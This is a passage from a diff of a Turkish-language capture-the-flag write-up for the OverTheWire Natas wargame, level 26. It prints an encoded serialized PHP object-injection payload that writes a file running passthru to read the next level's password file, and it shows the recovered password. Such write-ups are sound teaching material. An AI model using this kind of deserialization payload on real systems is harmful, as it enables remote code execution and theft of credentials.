@@ -643,9 +643,10 @@ Exploiti için;
 
 şeklinde malformed class oluşturuyoruz.Scriptin çalıştırılması sonucu;
 
-"Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL2J1cmp1LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjUwOiI8
-PyBwYXNzdGhydSgnIGNhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA%2FPiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUwOiI8PyBwYXNzdGh
-ydSgnIGNhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA%2FPiI7fQ%3D%3D" değerini elde ediyoruz.
+"Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL2J1cmp1LnBocCI7czoxNToiAExvZ2dlc
+gBpbml0TXNnIjtzOjUwOiI8PyBwYXNzdGhydSgnIGNhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA%2FPiI7czoxN
+ToiAExvZ2dlcgBleGl0TXNnIjtzOjUwOiI8PyBwYXNzdGhydSgnIGNhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA
+%2FPiI7fQ%3D%3D" değerini elde ediyoruz.
  
  <figure>
 <img src="/assets/img/natas/natas269.png">
@@ -657,3 +658,5 @@ ydSgnIGNhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA%2FPiI7fQ%3D%3D" değerini e
 img/burju.php adresine gidiyoruz.
 
 >> natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+
+#### Level 27 
